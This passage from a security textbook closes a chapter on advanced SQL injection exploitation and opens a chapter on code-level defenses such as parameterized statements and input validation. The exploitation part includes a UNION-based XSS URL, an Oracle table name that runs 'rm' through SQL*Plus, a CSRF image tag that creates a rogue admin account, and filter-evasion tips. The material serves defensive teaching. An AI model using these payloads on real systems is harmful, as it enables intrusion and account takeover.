back, but instead \nthe application  returns the output from an SQL query which you control, you can usually \nexploit the vulnerability to achieve the same effects as a reflected XSS attack. For example, if the application returns the results of the query as shown here:  \nSELECT orderNum, orderDesc, orderAmount FROM tblOrders WHERE orderType = 123  \nand the orderType  field is vulnerable to SQL injection, you may be able to create a proof -of-\nconcept XSS attack with a URL such as the following:  \nhttps://www.example.org/MyOrders.php?orderType=123+UNION+SELECT+1,‘<script>alert(1)</script>\n’,1 \nUnlike conventional XSS, the application does not simply echo your attack payload in its \nresponse. Rather, you modify the SQL query to append your payload to the query results, \nwhich the application copies into its response. Provided that the application does not perform any output encoding on the query results (if it assumes that the query results are trustwor thy), \nyour attack will be successful.  \nIn other situations, you may be able to leverage SQL injection vulnerabilities to perform a \npersistent XSS attack within the application. This possibility usually arises when data that you can modify via an SQL injecti on bug are displayed unsanitized to other users of the \napplication. This data might comprise actual HTML content that is stored within the database (such as product descriptions that are retrieved by product ID), or items such as user display names and con tact information which is retrieved from the database and copied into HTML \npage templates.  \nThe mass SQL injection attacks that occurred in 2008–2009 employed a robot which \nidentified every table within a target database, and injected a link to a malicious JavaScript file \ninto each text column in every table. Whenever the modified data were copied into application \nresponses, users were served the attacker’s malicious script. This script then attempted to exploit a number of client -side vulnerabilities in ord er to compromise users’ computers.  \nEven if an application does not contain any functionality where database data are copied \nunsanitized into application responses, this kind of attack may still be possible via SQL injection. If you can leverage the databas e compromise to attack the underlying operating \nsystem (see Chapter 6) you may be able to modify static content located within the Web root, and inject arbitrary JavaScript into pages that are rendered to other users.  \nRunning Operating System Commands on Oracle  \nBy using specially crafted database objects it is even possible to run operating system commands on the database server or on the workstation of a database administrator (DBA) using a hybrid attack.  \nThe following  table name is valid if the table name is quoted by double quotes:  \nCREATE TABLE “!rm Rf/” (a varchar2(1));  \nand will be accepted by Oracle.  \nIf a DBA or developer uses SQL ∗Plus scripts with the spool command, a common technique \nthat DBAs use for writing dynamic SQL scripts, then SQL ∗Plus will remove the double quotes \nfrom the example above in order to access the object. SQL ∗Plus will then inter pret the \nexclamation mark as a host command (! on UNIX, $ on Windows and VMS), and the content after the ! is executed as an operating system command.  \nHere is an example of a vulnerable SQL ∗Plus script. A spool file called test.sql is created \nand then executed:  \nSPOOL test.sql  \nSELECT table_name FROM all_tables WHERE owner=‘SCOTT’;  \nSPOOL OFF  \n@test.sql  \nExploiting Authenticated Vulnerabilities  \nMany SQL injection vulnerabilities reside within authenticated functionality. In some cases, \nonly privileged users, such as application administrators, can reach and exploit the vulnerability. Usually, this constraint reduces the impact of the vulnerabilit y somewhat.  \nIf the administrator is completely trusted within the application, and is also able to perform \narbitrary SQL queries directly in the database, one might suppose that SQL injection flaws which only the administrator can access are completely inconsequential, and are not exploitable unless the attacker has already compromised the administrator’s account.  \nHowever, this overlooks the possibility of cross -site request forgery. This attack technique \ncan be combined with many kinds of authenticated vul nerabilities to make those vulnerabilities \nexploitable by an unprivileged attacker. Consider an administrative function which displays the account details of a selected user:  \nhttps://www.example.org/admin/ViewUser.aspx?UID=123  \nThe UID parameter is vulnerable to SQL injection, but this can be directly exploited only by \nthe administrator. However, an attacker who is aware of the vulnerability can use cross -site \nrequest forgery to exploit the bug indirectly. For example, if he creates a Web page containing the following HTML, and induces a logged- in administrator to visit it, his injected SQL query \nwill be executed, creating a new administrative user that is controlled by the attacker:  \n<img src=“ https://www.example.org/admin/ViewUser.aspx?UID=123;  \n+INSERT+INTO+USERS+(username,password,isAdmin)+VALUES+(‘pablo’,  \n‘quest45th’,true)”>  \nNote that cross -site request forgery is a one- way attack, and the attacker cannot trivially \nretrieve the application’s response to the attack request. Hence, the attacker must inject a SQL query which causes a useful side effect, rather than just seeking to read sensitive data.  \nThe moral of this story is  that cross -site request forgery does not need to involve application \nfunctionality that was actually designed for performing sensitive actions. In the example described, the application is no less vulnerable than if it contained an explicit function for performing arbitrary SQL queries that were accessible only  to administrators but not protected \nfrom request forgery. And because the example described is not actually designed for \nperforming an action, it is much less likely to be included in the scope of a ny anti -request \nforgery defenses that are implemented within the application.  \nSummary  \nIn this chapter, we examined various advanced techniques which you can use to make your \nSQL injection attacks more effective, and to overcome obstacles that you will sometimes encounter in real -world applications. \nIn the mid - to late 1990s, the Web was full of obvious SQL injection flaws that attackers \ncould exploit with ease. As awareness of that vulnerability has become more widespread, the vulnerabilities that remain te nd to be subtler, involve some defenses that need to be \ncircumvented, or require you to combine several different attack techniques to deliver a compromise. \nMany Web applications, and external defenses such as Web application firewalls, perform \nsome rudime ntary input validation in an attempt to prevent SQL injection attacks. We \nexamined a wide range of techniques which you can use to probe and, if possible, bypass this validation. In some cases, all inputs received from HTTP requests are handled safely on arrival, but are persisted and reused later in an unsafe manner. We also examined a reliable \nmethodology which you can use to find and exploit these “second- order” SQL injection \nvulnerabilities.  \nToday’s applications are increasingly making use of new featur es in HTML5 to provide a \nricher user experience. Client -side SQL databases can be used for local data storage, allowing \nclient -side applications to be more responsive and even operate offline. As with other SQL \ndatabases, if attacker -controllable data are handled in an unsafe way, SQL injection \nvulnerabilities can arise, allowing the attacker to modify and steal sensitive data, or carry out unauthorized actions. Detection and exploitation of these vulnerabilities can be difficult, which make use of client -side storage a fruitful area to mine for exploitable bugs.  \nIn some cases, SQL injection vulnerabilities may exist but you may not be able to directly \nexploit them on their own to achieve your objectives. It is often possible to combine these bugs with other  vulnerabilities or attack techniques to deliver a successful compromise. I described \nways to exploit data captured via SQL injection to perform other attacks, ways to use SQL injection to perform cross -site scripting attacks that are not otherwise possible, and a way to \nexploit SQL injection bugs in privileged authenticated functionality to exploit vulnerabilities \nthat are not directly accessible when considered on their own.  \nThe catalog of attacks described in this chapter is by no means exhaustive. Real -world \napplications are extremely varied, and you should expect to encounter unusual situations that we have not considered here. Hopefully, you can use the basic techniques and ways of thinking examined in this chapter to address new situations, combining them in imaginative ways to \novercome obstacles and perform a successful compromise.  \nSolutions fast track  \nEvading Input Filters  \n• Work systematically with simple inputs to understand what filters the application is using.  \n• Depending on the filters in place, try relevant evasion techniques in an attempt to block the \nfilters, including using case variation, SQL comments, standard and malformed URL encodings, dynamic query execution, and null bytes. \n• Look for logic flaws in mu ltistep filters, such as the failure to strip expressions recursively, \nor unsafe truncation of input. \n• If effective application -wide filters are in place, look for non -standard entry points which the \nfilters may overlook, such as parameter names and HTTP request headers.  \nExploiting Second -Order SQL Injection  \n• Review the application’s functionality, looking for cases where user -supplied data are stored \nand reused.  \n• Submit a single quotation mark in each item of data. If your input is blocked or sanitized, use \nthe filter evasion techniques described in this chapter to attempt to defeat the filters.  \n• Walk through the relevant functionality where the data are used, looking for anomalous \nbehavior.  \n• For each anomaly detected, try to develop a proof -of-concept  attack to prove that the \napplication is in fact vulnerable to SQL injection. If no error information is returned, try using time delay strings to induce a noticeable delay in the relevant responses. \nExploiting Client -Side SQL Injection \n• Review the client -side JavaScript code for any use of HTML5 client -side SQL databases.  \n• Identify any items of attacker -controllable data that are being handled in client -side SQL \nqueries. Using your own instance of the client -side application, test the application’s \nhandl ing of unexpected input, particularly that which does not originate in normal on- screen \ntext input fields.  \n• If the application handles any attacker -controllable data in an unsafe way, determine whether \nyou can use SQL injection, together with the existing  functionality of the application, to \nextract sensitive data or perform unauthorized actions.  \nUsing Hybrid Attacks  \n• Anytime you discover a SQL injection vulnerability, think about how you can combine it \nwith other bugs and techniques to deliver a more sophisticated compromise of the \napplication. \n• Always look for ways to use data retrieved via SQL injection, such as usernames and \npasswords, to escalate your attack against the application. \n• You can often use SQL injection to perform cross -site scripting attacks within an application, \nmost significantly persistent attacks which will compromise other users who are accessing the application in the normal way.  \n• If you discover SQL injection vulnerabilities in privileged authenticated application \nfunctions, exa mine whether you can use cross -site request forgery to deliver a successful \nattack as a low -privileged user.  \nFrequently Asked Questions  \nQ: The application I am testing uses a Web application firewall which claims to block all SQL \ninjection attacks. Should I bother testing for the issue?  \nA: Most definitely. Try all of the filter evasion techniques described in this chapter, to probe \nthe WAF’s input validation. Remember that SQL injection into numeric data fields usually does not require the use of single quotation marks. Test non- standard entry points such as \nparameter names and request headers, which the WAF may not check. Research the WAF \nsoftware, looking for known security issues. If you can get a local installation of the WAF, you \ncan test it yourself to  understand exactly how its filters work and where any vulnerabilities \nmight lie.  \nQ: The application I’m attacking blocks any input containing single quotes. I’ve found a SQL \ninjection vulnerability in a numeric field, which isn’t encapsulated in single quotes within the query, but I want to use a quoted string in my exploit. How can I do this?  \nA: You can construct a string in your exploit without needing any quotes by using the CHAR  \nor CHR  function.  \nQ: The example of the truncation vulnerability looks pretty obscure and difficult to detect if \nyou don’t already know exactly what operations the application is performing. How would you try to discover this bug in the real world?  \nA: Actually, it’s pretty eas y to find, and you don’t need to know the length at which your input \nis being truncated after the quotes are doubled up. Typically, you can discover the issue by submitting the following two payloads in the relevant request parameter: \n’’’’’’’’’’’’’’’’’’’’’ ’’’’’’’’’’’’’’’’’’’’’’’’’’ …  \na’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’’ …  \nIf the truncation vulnerability is present, one of these payloads will result in an odd number \nof quotes being inserted into the query, causing an unterminated string, and there fore a \ndatabase error.  \n \n \n \n  \n \nChapter 8  \nCode -level defenses  \nErlend Oftedal  \nSolutions in this chapter:  \n• Domain Driven Security  \n• Using Parameterized Statements  \n• Validating Input  \n• Encoding Output  \n• Canonicalization  \n• Design Techniques to Avoid the Dangers of SQL  Injection  \nIntroduction  \nIn Chapters 4–7, we focused on ways to compromise SQL injection. But how do we fix it? \nAnd how do we prevent SQL injection in our applications going forward? Whether you’re a \ndeveloper with an application that is vulnerable to SQL injection, or whether you’re a security professional who needs to advise your client, there are a reasonably small number of things that you can do at the code level to reduce or eliminate the threat of SQL injection.  \nThis chapter covers several large areas of secure coding behavior as it relates to SQL \ninjection. It starts with the introduction of a design approach that helps developers understand and implement mitigations against injection attacks. Next we’ll go into detail and discuss alternatives to dynamic string building when utilizing SQL in an application. We’ll discuss different strategies regarding validation of input received from the user, and potentially from elsewhere. Closely related to input validation is output encoding, which is also an important part of the arsenal of defensive techniques that you should consider for deployment. And directly related to input validation, we’ll cover canonicalization of data so that you know the data you are operating on is the data you expected. Last but not least, we’ll discuss other design -level  considerations and resources you can use to promote secure applications. \nYou should not consider the topics we’ll discuss in this chapter to be techniques to \nimplement in isolation; rather, they’re techniques you should normally implement as part of a \ndefense-in-depth strategy. This follows the concept that you do not rely  on any single control \nto address a threat, and where possible, you have additional controls in place in case one of these controls fails. Therefore, it is likely that you’ll need to implement more than one of the techniques we’ll cover in this chapter to fully secure an application against SQL injection.  \nDomain Driven Security  \nDomain Driven Security (DDS) is an approach to design code in such a way that it will avoid typical injection pro blems. If we look at code vulnerable to SQL injection, we often see \nmethods taking very generic inputs. Typically a login function could look something like this:  \npublic boolean isValidPassword(String username, String password) {  \n String sql = “SELECT ∗ FROM user WHERE username=’”  + username + “’ AND password=’”  + \npassword + “’” ; \n Result result = query(sql);  \n … \n} \nWhile the password handling is already questionable, we’ll ignore that for now (see the \nHandling sensitive data section later in this chapter). Looking at the method signature above, what are the actual semantics of the method? It does not convey the limitations and expectations set on its inputs. It seems to tell us that it supports any string as a username and any string a s a password, though this is not the case. Most applications have restrictions on the \nlengths and character types allowed in usernames and passwords, but there are no traces of this in this signature. While input validation performed in other codes may sto p invalid usernames \nor passwords from ever reaching this method, as our application evolves and new code is added, the input validation may unintentionally become circumvented by new functionality that directly accesses unprotected methods.  \nDomain Driven S ecurity  \nDomain Driven Security is an approach that aims to help developers reason about and implement mitigation \nagainst any type of injection attack —including SQL injection and Cross Site Scripting. The idea was built for \ndevelopers by developers, and tak es its inspiration from the Domain Driven Design (DDD) approach proposed by \nEric Evans and tries to leverage some of the concepts from DDD to improve security.  \nFrom DDD we learn that our model of the domain plays a key role in how we communicate \nwithin a team. By taking the terms used by the different stakeholders and the business the \napplication is supporting, and reusing them within our domain model we build a common, or \nubiquitous, language within the team. Some of the concepts of the model are made expl icit and \nbecome classes. Others are implicit and only found in variable or method naming.  \nIn Figure 8.1 we build a simple model of our application by mapping data between the three \nmost important parts of our applicat ion. This figure reveals some interesting aspects of our \napplication. We seem to have three different implicit representations of our username concept. One is in the browser, where the username is realized as a \nstring . There is also a representation \nin our  server side application, where the username is a string . The last one is in the database \nwhere the username is realized as a database data type (in this case a varchar ). \n \nFigure 8.1  Mapping Data from the Browser to the Database \nLooking at the mapping on the right hand we clearly see that something is wrong. While the \nmapping from “admin” on the left side seems  to correct, on the right hand we end up at a value \ncompletely different from what was coming in from the browser.  \n\nIn the example code above, both username and password are implicit concepts. Whenever \nan implicit concept is causing us problems, Domain Driven Design tells us we should aim to \nmake that concept explicit. In DDS we would thus introduce a class for each of these, and use those classes whenever the concepts are needed.  \nIn Java we could make the username concept explicit by creating a \nUsername  class—a value \nobject —like this: \npublic class Username {  \n private static Pattern USERNAME_PATTERN = Pattern.compile(“^[a -z]{4,20}$”);  \n private final String username;  \n public Username(String username) {  \n  if (!isValid(username)) {  \n   throw new IllegalArgumentException(“Invalid username: ” + username);  \n  } \n  this.username = username;  \n } \n public static boolean isValid(String username) {  \n  return USERNAME_PATTERN.matcher(username).matches();  \n } \n} \nIn this class we have encapsulated the raw string and performed input validation in the \nconstructor of the object. This has some real benefits. Wherever we have a Username  object in \nour code, that object is valid according to our input validation rules. There is no way to create a \nUsername  object holding an invalid user name. Thus we can avoid duplicating validation logic \ninto other methods elsewhere in out code that are also handling usernames. This also simplifies unit testing, as we only have to unit tes t this logic for our Username class.  \nAnother benefit of building our class this way, is that it simplifies finding the input \nvalidation if required elsewhere in our code. As a developer, you can simply type Username , \nhave the IDE show a list of possible me thods, and there it is. We can use this approach for any \nsimilar concept, and we will get the same benefit. It becomes much easier to find the input \nvalidation functionality when it is directly connected to the concept in question, instead of having to look for it in a generic utility class or list of regular expressions. Having an easy to find concept also lowers the risk of having duplicate and possibly differing and incorrect implementations, which tends to happen in larger code bases.  \nIf we apply our input validation and explicit concepts to our mapping figure, the mapping \nends up looking like in Figure 8.2. If all our internal calls are now using the \nUsername  concept, \nany value entering our application as a string will have to be wrapped in a Username  object \nbefore it can be passed through the system. Thus we will reject invalid values when data is entering our application instead of scattering the validation logic, or calls to said logic, throughout our code.  \n \nFigure 8.2  Stopping Invalid Data at the Border  \nIn the implementation of our Username  class we used an input val idation rule allowing \nusernames of 4 –20 characters from a to z. But let us consider a slightly different example. In a \nnew version of the same system we are asked to support email addresses as the username. This \n\ncomplicates the validation rules.  Characters  allowed in email addresses are described in RFC \n5322, and include many of the characters that are used in SQL -injection attacks —most notably \nsingle quotes.  \nWhile input validation can stop some attacks at the borders, it tends to become difficult \nwhen the input types get more complex. Some of the common—and wrong—solutions to these \nproblems, are to blacklist common keywords from SQL. While this may make sense for some types of data, words like select  and delete are parts of the English language, and thus cannot be \nblocked in textual data. And if we look at Figure 8.3 we see that the problem actually does not \noccur in the mapping from the Web browser model to the application model. It occurs in the mapping from the application model to the database model. The actual bug is that our application fails to map an application data value to the correct database data value. Thus to solve the problem, we have to make sure that data st ays data, and does not become a part of the \ncontrol flow of SQL. In short, numbers should stay numbers and text should stay text. \n \nFigure 8.3  Locating the Actual Bug  \nThe safest way to solve this mapping problem is to directly use parameterized statements or \nan abstraction layer that is using parameterized statements. By using prepared statements we are relying o n a standard way of making sure data stays data. And it’s one built into the \nframeworks and related database drivers. If we were using parameterized statements \n\neverywhere we could allow direct access to the raw username  string in our Username  object either  \nby changing the field from private  to public : \npublic class Username {  \n … \n public final String username;  \nor by adding a getter:  \npublic String getUsernameString() {  \n return username;  \n} \nor by changing toString()  to return the value:  \n@Override  \npublic String toString() {  \n return username;  \n} \nIf for some reason it is not possible to use parameterized statements, we need to do proper \noutput encoding. One aspect that makes encoding more difficult to implement is that we need \nto handle differences in how database implementations handle input. A character benign to one database may cause problems for another one. This especially creates problems if we are using different database products in the different  stages of development (test, QA, and production). \nWhen using output encoding, we can lock down access to the \nusername  value and supply helper \nmethods:  \npublic String asSQLSafeString() {  \n return Encoder.encodeForSQL(username);  \n} \nThe Encoder  utility used here is a class we implement where we put all logic related to how \nwe encode a string for the database we are using. It is important to keep the logic for encoding \na string in a separate single class in order to avoid duplicating the encoding logic across classes \nand over time possibly ending up with differing implementations of the encoding functionality.  \nUsing parameterized statements  \nAs we discussed in previous chapters, one of the root causes of SQL injection is the creation of SQL queries as strings that are then sent to the database for execution. This behavior, commonly known as dynamic string building or dynamic SQL, is one of the primary causes of an application being vulnerable to SQL injection.  \nAs a more secure alternative to dynamic string building, most modern programming \nlanguages and database access application program interfaces (APIs) allow you to provide parameters to a SQL query through the use of placeholders, or bind variables, instead of working directly with the user input. Commonly known as parameterized statements, these are \na safer alternative that can avoid or solve many of the common SQL injection issues you will see within an application, and you can use them in most common situations to replace an existing dynamic que ry. They also have the advantage of being very efficient on modern \ndatabases, as the database can optimize the query based on the supplied prepared statement, increasing the performance of subsequent queries.  \nI should note, however, that parameterized stat ements are a method of supplying potentially \ninsecure parameters to the database, usually as a query or stored procedure call. They do not alter the content of the values that are passed to the database, though, so if the database functionality being calle d uses dynamic SQL within the stored procedure or function \nimplementation it is still possible for SQL injection to occur. This has historically been a \nproblem with Microsoft SQL Server and Oracle, both of which have shipped with a number of built-in store d procedures that were vulnerable to SQL injection in the past, and it is a danger \nthat you should be aware of with any database stored procedures or functions that use dynamic SQL in their implementation. An additional issue to consider is that malicious content could have been stored in the database at this point that may then be used elsewhere in the application, causing SQL injection at another point in the application. We discussed this in Chapter 7 , in “Exploiting  second -order SQL injection.”  \nHere is an example of a vulnerable piece of login page pseudocode using dynamic SQL. We \nwill discuss how to parameterize this code in Java, C#, and PHP in the following sections:  \nUsername = request(“username”)  \nPassword = request(“password”)  \nSql = “SELECT ∗ FROM users WHERE username= ’” + Username + “‘ AND password=’”+ Password + “’”  \nResult = Db.Execute(Sql)  \nIf (Result) /∗  successful login ∗ / \nTools & traps… \nWhat Can be Parameterized, and What Can’t? \nNot all dynamic SQL statements  can be parameterized. In particular, you can parameterize only data values, and \nnot SQL identifiers or keywords. Therefore, you can’t have parameterized statements such as the following:  \nSELECT ∗ FROM ? WHERE username = ‘john’ \nSELECT ? FROM users WHERE us ername = ‘john’  \nSELECT ∗ FROM users WHERE username LIKE ‘ j%’ ORDER BY ?  \nUnfortunately, a common solution presented in online forums to solve this problem is to use dynamic SQL in \nthe string that is then used to parameterize the query, as in the following example:  \nString sql = “SELECT ∗ FROM ” + tblName + “  WHERE user =? ”; \nIn this case, you can end up introducing an SQL injection issue where there previously wasn’t one by trying to \nparameterize a statement.  \nIn general, if you’re trying to supply an SQL identifier as a parameter, you should look at your SQL and how \nyou’re accessi ng your database first, and then look at whether it is possible to rewrite the query using a fixed \nidentifier. Although it may be possible to solve this through the use of dynamic SQL, this is also likely to \nadversely affect the performance of the query, as the database will not be able to optimize the query. If dynamic \nSQL is required, ensure that known value validation (discussed later in this chapter) is performed to validate \nidentifiers in the database metadata where possible.  \nParameterized Statements i n Java  \nJava provides the Java Database Connectivity (JDBC) framework (implemented in the java.sql  \nand javax.sql  namespaces) as a vendor -independent method of accessing databases. JDBC \nsupports a rich variety of data access methods, including the ability to use parameterized \nstatements through the PreparedStatement  class.  \nHere is the earlier vulnerable example rewritten using a JDBC prepared statement. Note that \nwhen the parameters are added (through the use of the various set<type>  functions, such as \nsetString), the index position (starting at 1) of the placeholder question mark is specified:  \nConnection con = DriverManager.getConnection(connectionString);  \nString sql = “SELECT ∗  FROM users WHERE username=? AND password=?” ; \nPreparedStatement lookupUser = con.prepareStatement(sql);  \n// Add parameters to SQL query  \nlookupUser.setString(1, username); // add String to position 1  \nlookupUser.setString(2, password); // add String to position 2  \nrs = lookupUser.executeQuery();  \nIn addition to the JDBC framework that is provided with Java, additional packages are often \nused to access databases efficiently within J2EE applications. A commonly used persistence \nframework for accessing databases is Hibernate.  \nAlthough it is possible to utilize native SQL functionality, as well a s the JDBC functionality \nshown earlier, Hibernate also provides its own functionality for binding variables to a parameterized statement. Methods are provided on the \nQuery  object to use either named \nparameters (specified using a colon; e.g. :parameter ) or the JDBC -style question mark \nplaceholder ?). \nThe following example demonstrates the use of Hibernate with named parameters:  \nString sql = “SELECT ∗  FROM users WHERE username=:username AND ” +“password=:password” ; \nQuery lookupUser = session.createQuery(sql);  \n// Add parameters to SQL query  \nlookupUser.setString(“username”, username); // add username  \nlookupUser.setString(“password”, password); // add password  \nList rs = lookupUser.list();  \nThe next example shows the use of Hibernate with JDBC -style question mark placeholders \nfor the parameters. Note that Hibernate indexes parameters from 0, and not 1, as does JDBC. \nTherefore, the first parameter in the list will be 0 and the second will be 1 : \nString sql = “SELECT ∗  FROM users WHERE username=? AND password=?” ; \nQuery lookupUser = session.createQuery(sql);  \n// Add parameters to SQL query  \nlookupUser.setString(0, username); // add username  \nlookupUser.setString(1, password); // add password  \nList rs = lookupUser.list();  \nParameterized Statements in .NET (C#)  \nMicrosoft .NET provides access to a number of different ways to parameterize statements by using the ADO.NET Framework. ADO.NET also provides additional  functionality, allowing \nyou to further check the parameters supplied, such as by type -checking the data you are \npassing in.  \nADO.NET provides four different data providers, depending on the type of database that is \nbeing accessed: \nSystem.Data.SqlClient  for Microsoft SQL Server, System.Data.OracleClie nt for \nOracle databases, and System.Data.OleDb  and System.Data.Odbc  for OLE DB and ODBC data \nsources, respectively. Which provider you use will depend on the database server and drivers being used to access the database. Unfortunately, the syntax for utili zing parameterized \nstatements differs among the providers, notably in how the statement and parameters are specified. Table 8.1 shows how parameters are specified in each provider.  \nTable 8.1  ADO.NET Data Providers, an d Parameter Naming Syntax  \nData Provider  Parameter Synta x \nSystem.Data.SqlClient  @parameter  \nSystem.Data.OracleClient  :parameter  (only in parameterized SQL command text)  \nSystem.Data.OleDb  Positional parameters with a question mark placeholder ( ?) \nSystem.Data.Odbc  Positional parameters with a question mark placeholder ( ?) \nThe following example shows the vulnerable example query rewritten as a parameterized \nstatement in .NET using the SqlClient  provider:  \nSqlConnection con = new SqlConnection(ConnectionString);  \nstring Sql = “SELECT ∗  FROM users WHERE username=@username ” +“AND password=@password” ; \ncmd = new SqlCommand(Sql, con);  \n// Add parameters to SQL query  \ncmd.Parameters.Add(“@username”, // nameSqlDbType.NVarChar, // data type  \n16); // length  \ncmd.Parameters.Add(“@password”,SqlDbType.NVarChar,  \n16); \ncmd.Parameters.Value[“@username”] = username; // set parameters  \ncmd.Parameters.Value[“@password”] = password; // to supplied values  \nreader = c md.ExecuteReader();y  \nThe next example shows the same parameterized statement in .NET using the OracleClient  \nprovider. Note that the parameters are preceded by a colon in the command text (the Sql \nstring), but not elsewhere in the code:  \nOracleConnection con = new OracleConnection(ConnectionString);  \nstring Sql = “SELECT ∗  FROM users WHERE username=:username ” +“AND password=:password” ; \ncmd = new OracleCommand(Sql, con);  \n// Add parameters to SQL query  \ncmd.Parameters.Add(“username”, // nameOracleType.VarChar, // data type  \n16); // length  \ncmd.Parameters.Add(“password”,OracleType.VarChar,  \n16); \ncmd.Parameters.Value[“username”] = username; // set parameters  \ncmd.Parameters.Value[“password”] = password; // to supplied values  \nreader = cmd.ExecuteReader();  \nThe final example shows the same parameterized statement in .NET using the OleDbClient  \nprovider. When using the OleDbClient  provider, or the Odbc provider, you must add parameters \nin the correct order for the pl aceholder question marks:  \nOleDbConnection con = new OleDbConnection(ConnectionString);  \nstring Sql = “SELECT ∗  FROM users WHERE username=? AND password=?” ; \ncmd = new OleDbCommand(Sql, con);  \n// Add parameters to SQL query  \ncmd.Parameters.Add(“@username”, // nameOleDbType.VarChar, // data type  \n16); // length  \ncmd.Parameters.Add(“@password”,OleDbType.VarChar,  \n16));  \ncmd.Parameters.Value[“@username”] = username; // set parameters  \ncmd.Parameters.Value[“@password”] = password; // to supplied values  \nreader = cmd.Execu teReader();  \nTip \nWhen using parameterized statements with ADO.NET, it is possible to specify less or more detail about the \nstatement than I did in the preceding example. For instance, you can specify just the name and the value in the \nparameter constructor.  In general, it is a good security practice to specify parameters as I did, including the data \nsize and type, because this provides an additional level of coarse- grained validation over the data that is being \npassed to the database.  \nParameterized Statement s in PHP  \nPHP also has a number of frameworks that you can use to access a database. I’ll demonstrate \nthree of the most common frameworks in this section: the mysqli package for accessing MySQL databases, the PEAR::MDB2 package (which superseded the popular  PEAR::DB \npackage), and the new PHP Data Objects (PDOs) framework, all of which provide facilities for using parameterized statements.  \nThe mysqli package, available with PHP 5. x and able to access MySQL 4.1 and later \ndatabases, is one of the most commonly used database interfaces, and supports parameterized statements through the use of placeholder question marks. The following example shows a parameterized statement using the mys qli package:  \n$con = new mysqli(“localhost”, “username”, “password”, “db”);  \n$sql = “SELECT ∗  FROM users WHERE username=? AND password=?” ; \n$cmd = $con- >prepare($sql);  \n// Add parameters to SQL query  \n$cmd->bind_param(“ss”, $username, $password); // bind parameters as strings  \n$cmd->execute();  \nWhen using PHP with PostgreSQL a simple to use method for parameterized statements was \nintroduced in PHP 5.1.0. This method is named pg_query_params()  and allows developers to \nsupply the SQL query and the parameters on the same line, as in the following example:  \n$result = pg_query_params(“SELECT ∗ FROM users WHERE username=$1 AND password=$2” , \nArray($username, $password));  \nThe PEAR::MDB2 package is a widely used and vendor -independent framework for \naccessing databases. MDB2 supports named parameters using the colon character and using \nplaceholder question marks. The  following example demonstrates the use of MDB2 with \nplaceholder question marks to build a parameterized stat ement. Note that the data and types are \npassed in as an array which maps to the placeholders in the query:  \n$mdb2 =& MDB2::factory($dsn);  \n$sql = “SELECT ∗  FROM users WHERE username=? AND password=?” ; \n$types = array(‘text’, ‘text’); // set data types  \n$cmd = $mdb2- >prepare($sql, $types, MDB2_PREPARE_MANIP);  \n$data = array($username, $password); // parameters to be passed  \n$result = $cmd ->execute($data);  \nThe PDO package, which is included with PHP 5.1 and later, is an object -oriented vendor -\nindependent data layer  for accessing databases. PDO supports both named parameters using \nthe colon character and the use of placeholder question marks. The following example demonstrates the use of PDO with named parameters to build a parameterized statement:  \n$sql = “SELECT ∗  FROM users WHERE username=:username AND” +“password=:password”;  \n$stmt = $dbh- >prepare($sql);  \n// bind values and data types  \n$stmt->bindParam(‘:username’, $username, PDO::PARAM_STR, 12);  \n$stmt->bindParam(‘:password’, $password, PDO::PARAM_STR, 12);  \n$stmt->execute();  \nParameterized Statements in PL/SQL  \nOracle PL/SQL offers also the possibility of using parameterized queries in database- level \ncode. PL/SQL supports binding parameters using the colon character with an index (e.g. :1). \nThe following example demonstr ates the use of PL/SQL with bound parameters to build a \nparameterized statement in an anonymous PL/SQL block:  \nDECLARE username varchar2(32);  \npassword varchar2(32);  \nresult integer;  \nBEGIN Execute immediate ‘SELECT count(∗ ) FROM users where username=:1 and password=:2 ’ into \nresult using username, password;  \nEND; \nParameterized Statements in mobile apps  \nA mobile application can either load data from a remote location, store data in a loca l database, \nor both. When loading data from remote locations, SQL -injection protection must be built into \nthe service that provides the data. If the application is using a local database, the protection \nmust be implemented in the application code. Both iOS  and Android based devices have in-\ndevice database support and provide APIs for creating, updating, and querying these databases. \nParameterized Statements in iOS Applications  \nThe APIs for developing apps for iOS support SQLite through the SQLite library \nlibsqlite3.dylib . One popular framework if working directly with SQLite (rather than through \nthe Apple framework Core Data) is the FMDB framework, with which we can build \nparameterized insert statements using the executeUpdate()  method:  \n[db executeUpdate:@“INSERT INTO artists (name) VALUES (?)”, @“Sinead O’Connor”];  \nSimilarly if we want to query the database, we use the executeQuery() method:  \nFMResultSet ∗rs = [db executeQuery:@“ SELECT ∗ FROM songs WHERE artist=?” , @“Sinead \nO’Connor”]; \nParameterized Statement s in Android Applications  \nAndroid devices also contain an API for accessing the SQLite database subsystem. This API \nsupports parameterized statements where the developer can supply query and data separately.  \nFor insert statements, we use the SQLiteStatement  class:  \nstatement = db.compileStatement(“INSERT INTO artists (name) VALUES (?)”);  \nstatement.bind(1, “Sinead O’Connor”);  \nstatement.executeInsert();  \nWhen querying the database we use the query()  method directly on the SQLiteDatabase  \nobject. This method take s a long list of arguments, where two of them allow us to build query \ntemplates and bind parameters:  \ndb.query(“songs”,  \n new String[] { “title” } /∗  columns to return ∗ /, \n “artist = ?” / ∗ where clause ∗ /, \n new String[] { “Sinead O’Connor” } /∗  parameters to bind ∗/, \n null /∗ group by ∗/, \n null /∗ having ∗/, \n null /∗ order by ∗/ \n); \nParameterized Statements in HTML5 Browser Storage \nThere are two types of storage available in the HTML5 standard —the Web SQL Database and \nthe Web Storage Specification. The Web SQL Database specification is no longer being actively maintained by W3C. This specification allowed developers to build a client side SQL \ndatabase, usually implemented in the browser using SQ Lite, which could be created and \nqueried using JavaScript. This specification included a simple way to do parameterized queries \nusing executeSql() : \nt.executeSql(‘SELECT ∗ FROM songs WHERE artist=? AND song=?’ , [artist, songName], \nfunction(t, data) {  \n //do something with data  \n}); \nIn the above code t is a transaction in which the SQL is executed. We use question marks as \nplaceholders and supply an array of the parameters in the order in which they should be applied into the SQL statement. The last argument is  a callback function for processing the \ndata returned from the database.  \nThe Web Storage Specification provides a simple key/value storage using the methods \nsetItem() , getItem() , and removeItem() . As this specification does not have a query language \nwhere queries are built by string concatenation, it is not subject to injection attacks similar to \nSQL injection.  \nValidating input  \nInput validation is the process of testing input received by the application for compliance against a standard defined within the a pplication. It can be as simple as strictly typing a \nparameter and as complex as using regular expressions or business logic to validate input. There are two different types of input validation approaches: whitelist validation (sometimes referred to as inc lusion or positive validation) and blacklist validation (sometimes known as \nexclusion or negative validation). These two approaches, and examples of validating input in Java, C#, and PHP to prevent SQL injection, are detailed in the following subsections . \nTip \nWhen performing input validation you should always ensure that the input is in its canonical (simplest) form \nbefore making any input validation decisions. This may involve decoding the input into a simpler format, or just \nrejecting input that isn’t alr eady in canonical format where non -canonical input isn’t expected. We’ll cover 